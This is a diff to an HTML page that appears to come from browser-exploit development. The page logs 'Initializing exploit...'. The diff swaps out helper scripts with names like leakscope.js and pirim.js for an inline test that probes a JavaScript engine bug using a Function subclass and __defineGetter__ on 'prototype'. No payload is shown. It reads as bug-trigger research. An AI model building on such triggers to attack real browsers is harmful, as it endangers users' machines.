@@ -6,9 +6,52 @@
 </head>
 <body>
     <div id="log">Initializing exploit...</div>
-    <script src="utils.js"></script>
-    <script src="leakscope.js"></script>
-    <script src="pirim.js"></script>
-    <script src="main.js"></script>
+    <script>
+        // tests for new idea
+        function assert(cond, msg) {
+  if (!cond) alert("Assertion failed: " + (msg || ""));
+}
+
+(function() {
+  class MyFunction extends Function {
+    constructor() {
+      super();
+      // The super.prototype = 1 line is unusual and probably not useful,
+      // but included to keep behavior similar.
+      super.prototype = 1;
+    }
+  }
+
+  function test1() {
+    try {
+      const f = new MyFunction();
+      // Use __defineGetter__ instead of defineGetter
+      f.__defineGetter__("prototype", () => {});
+      alert("test1: __defineGetter__ succeeded - this should NOT happen");
+    } catch (e) {
+      alert("test1: __defineGetter__ threw as expected: " + e);
+    }
+  }
+
+  function test2(i) {
+    try {
+      const f = new MyFunction();
+      try { 
+        f.__defineGetter__("prototype", () => {}); 
+      } catch(e) {
+        // ignore errors
+      }
+      f.prototype.x = i; // should NOT crash
+      alert("test2: assigned f.prototype.x = " + i + " successfully");
+    } catch(e) {
+      alert("test2: crash or error: " + e);
+    }
+  }
+
+  test1();
+  test2(0);
+})();
+
+    </script>
 </body>
 </html>
